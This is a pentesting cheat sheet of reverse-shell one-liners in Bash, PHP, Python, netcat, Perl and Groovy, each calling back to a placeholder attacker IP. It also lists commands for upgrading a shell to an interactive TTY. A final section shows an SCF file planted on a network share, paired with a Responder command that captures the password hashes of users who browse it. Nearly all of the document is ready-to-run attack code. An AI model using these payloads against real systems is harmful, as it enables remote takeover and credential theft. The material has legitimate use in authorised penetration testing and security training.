# Reverse Shells

### Software specific shells

| Name   | Value                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |
| ------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Bash   | bash -i >& /dev/tcp/111.1111.111.111/8080 0>&1                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| PHP    | php -r '$sock=fsockopen("111.1111.111.111",8080);exec("/bin/sh -i <&3 >&3 2>&3");'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| Python | python -c 'import socket,subprocess,os;s=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM);s.connect(("111.1111.111.111",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(\["/bin/sh","-i"]);'                                                                                                                                                                                                                                                                                                                                          |
| NC v1  | nc -e /bin/sh 111.1111.111.111 8080                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| NC v2  | rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc 111.1111.111.111 8080 >/tmp/f                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |
| Perl   | perl -e 'use Socket;$i="111.1111.111.111";$p=8080;socket(S,PF\_INET,SOCK\_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr\_in($p,inet\_aton($i)))){open(STDIN,">\&S");open(STDOUT,">\&S");open(STDERR,">\&S");exec("/bin/sh -i");};'                                                                                                                                                                                                                                                                                                                                             |
| Groovy | String host="{your\_IP}"; int port=8000; String cmd="/bin/bash"; Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()) {while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read()); while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close(); |

### Shell Upgrades

| Name     | Value                                           |
| -------- | ----------------------------------------------- |
| Perl     | perl -e 'exec "/bin/bash";'                     |
| Bash     | echo os.system('/bin/bash')                     |
| Python 3 | python3 -c 'import pty; pty.spawn("/bin/bash")' |
| Python 2 | python -c 'import pty; pty.spawn("/bin/bash")'  |

### Shell Fixes

| Name            | Value              |
| --------------- | ------------------ |
| Fix Window Size | stty rows X cols Y |
| Get Window Size | stty size          |
| Fix Output      | stty raw -echo     |

### Reverse shell files

#### SCF files

[https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/](https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/)\
\
It is not new that SCF (Shell Command Files) files can be used to perform a limited set of operations such as showing the Windows desktop or opening a Windows explorer. However a SCF file can be used to access a specific UNC path which allows the penetration tester to build an attack. The code below can be placed inside a text file which then needs to be planted into a network share.\
\
Saving the pentestlab.txt file as SCF file will make the file to be executed when the user will browse the file. Adding the @ symbol in front of the filename will place the pentestlab.scf on the top of the share drive.

```
[Shell]
Command=2
IconFile=\\X.X.X.X\share\pentestlab.ico
[Taskbar]
Command=ToggleDesktop
```

Responder needs to be executed with the following parameters to capture the hashes of the users that will browse the share.

```
responder -wrf --lm -v -I eth0
```

